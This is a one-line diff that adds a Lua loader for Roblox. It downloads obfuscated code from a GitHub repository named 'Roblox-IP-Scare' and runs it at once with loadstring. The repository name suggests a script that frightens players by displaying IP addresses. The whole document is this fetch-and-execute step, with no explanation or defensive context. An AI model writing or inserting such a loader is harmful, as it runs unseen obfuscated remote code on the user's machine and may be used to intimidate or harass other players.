@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/KevooRBLX/Roblox-IP-Scare/main/OBF%20DATA"),true))()
